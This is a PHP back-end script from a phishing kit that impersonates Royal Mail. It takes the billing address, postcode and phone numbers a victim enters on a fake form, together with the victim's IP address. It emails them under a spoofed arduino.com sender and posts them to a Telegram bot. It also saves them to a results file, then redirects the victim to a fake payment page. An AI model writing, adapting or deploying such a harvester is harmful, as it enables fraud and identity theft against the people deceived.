<?php
/*

  /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$        /$$$$$$$   /$$$$$$   /$$$$$$ 
 /$$__  $$| $$__  $$| $$__  $$ /$$__  $$| $$$ | $$ /$$__  $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$| $$| $$  \ $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$ $$ $$| $$  | $$      | $$  | $$| $$$$$$$$|  $$$$$$ 
| $$__  $$| $$__  $$| $$  | $$ >$$__  $$| $$  $$$$| $$  | $$      | $$  | $$| $$__  $$ \____  $$
| $$  | $$| $$  \ $$| $$  | $$| $$  \ $$| $$\  $$$| $$  | $$      | $$  | $$| $$  | $$ /$$  \ $$
| $$  | $$| $$  | $$| $$$$$$$/|  $$$$$$/| $$ \  $$|  $$$$$$/      | $$$$$$$/| $$  | $$|  $$$$$$/
|__/  |__/|__/  |__/|_______/  \______/ |__/  \__/ \______/       |_______/ |__/  |__/ \______/ 
                                                                                                
                                                                                                
                                                                                                

*/
error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$message = "[===== ♠️ ⚡ Royalmail RZLT(CVV) ⚡ ♠️ =====]\r\n";
$message .= "|Country		 : ". $_POST["country"]."\r\n";
$message .= "|Flat Name      : ".$_POST['flatname']."\r\n";
$message .= "|Property name  : ".$_POST['name3']."\r\n";
$message .= "|Property number: ".$_POST['number']."\r\n";
$message .= "|Street         : ".$_POST['street']."\r\n";
$message .= "|City or town   : ".$_POST['city']."\r\n";
$message .= "|County         : ".$_POST['county']."\r\n";
$message .= "|Postcode       : ".$_POST['postcode']."\r\n";
$message .= "|fix Number     : ".$_POST['homephone']."\r\n";
$message .= "|Mobile number  : ".$_POST['mobile']."\r\n";
$message .= "[========= $ip ========]\r\n";
include "../../bots/html-5.php";
$send = $email; 
$subject = "♠️ (".$_SESSION["name"].") Billing RZLT ♠️ $ip";
$headers = "From: [ARD8NO_DAS **]<info@arduino.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../ARDUINO_DAS_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);
header('Location: ../pay.html');

?>
